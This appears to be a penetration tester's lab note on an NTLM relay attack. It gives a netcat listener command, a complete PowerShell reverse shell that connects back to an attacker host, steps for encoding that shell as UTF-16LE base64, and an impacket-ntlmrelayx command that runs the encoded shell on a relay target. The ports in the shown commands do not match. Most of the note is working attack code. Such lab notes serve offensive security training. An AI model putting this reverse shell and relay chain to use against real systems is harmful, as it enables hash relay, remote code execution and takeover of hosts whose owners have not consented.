### Must have a shell, or some way to trigger a request that relays a ntlm hash

Shell will work, or web...(CSRF, injection, ect)

1.  ## **Start listener:**
    

`nc -nvlp {{ port }}`

> Below example assumes a bind shell is on port 5555, and that the relay target (where hash is being passed to) is 212

Distant IP: 192.168.203.212

LocalIP: 192.168.45.154 <--- Local box

Source of relay: 192.168.203.211 5555

2.  ## **Convert shell into UTF-16LE(1200) Base64 encoded**
    

```
$client  =  New-Object System.Net.Sockets.TCPClient("192.168.45.154",1234);$stream  =  $client.GetStream();\[byte\[\]\]$bytes  =  0..65535|%{0};while(($i  =  $stream.Read($bytes,  0,  $bytes.Length)) -ne  0){;$data  = (New-Object  -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,  $i);$sendback  = (iex $data  2>&1  |  Out-String );$sendback2  =  $sendback  +  "PS "  + (pwd).Path +  "\> ";$sendbyte  = (\[text.encoding\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

Either can use iconv:

`iconv -f UTF-8 -t UTF-16LE a-8.strings > b-16.strings`

or

**Cyberchef**
![61a3b9a08e8fb13645f78c5eeb53c154.png](../../../_resources/61a3b9a08e8fb13645f78c5eeb53c154.png)

<insert pic="">

3.  ## **Start the relay with the encoded command:**
    

`sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.203.212 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA0ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`

- [ ] May need to ensure that virtual host is added to the /etc/hosts files on local machine (webserver)
    
- [ ] May also need to validate that there is no execution policy set for powershell
    

4.  Execute the request that passes the NTLM hash

Example:
**![11f3711bada5ea8592248bad55bb507b.png](../../../_resources/11f3711bada5ea8592248bad55bb507b.png)**

</insert>